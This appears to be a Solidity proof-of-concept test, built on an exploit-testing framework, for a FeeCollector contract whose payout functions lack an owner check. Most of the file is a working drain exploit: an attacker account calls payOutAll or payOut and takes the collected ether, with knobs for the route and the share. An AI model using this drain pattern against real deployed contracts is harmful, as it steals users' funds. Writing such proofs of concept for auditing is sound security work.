// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {FeeCollector} from "../src/FeeCollector.sol";

/// @notice Missing permission check: the two payout functions say "owner only" but check nothing.
/// Knobs:
///   0 `route`      0 drains through `payOutAll`, 1 through `payOut`;
///   1 `share_bps`  for `payOut`, the share of the collected fees taken, in basis points.
contract FeeCollectorDrainPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    FeeCollector internal collector;

    function setUpTarget() internal override {
        collector = new FeeCollector(makeAddr("owner"));
        address payer = makeAddr("payer");
        vm.deal(payer, 20 ether);
        vm.prank(payer);
        collector.collect{value: 20 ether}();

        declareAttackerBalance(0, 0, 1 ether);
        declareKnob(0, "route", 0, 0, 1);
        declareKnob(1, "share_bps", BPS, 1, BPS);
    }

    function exploit() internal override {
        uint256 balanceBefore = attacker.balance;

        vm.startPrank(attacker);
        if (knob(0) == 0) {
            collector.payOutAll(payable(attacker));
        } else {
            collector.payOut(payable(attacker), address(collector).balance * knob(1) / BPS);
        }
        vm.stopPrank();

        attacker_profit("eth", balanceBefore, attacker.balance);
    }
}
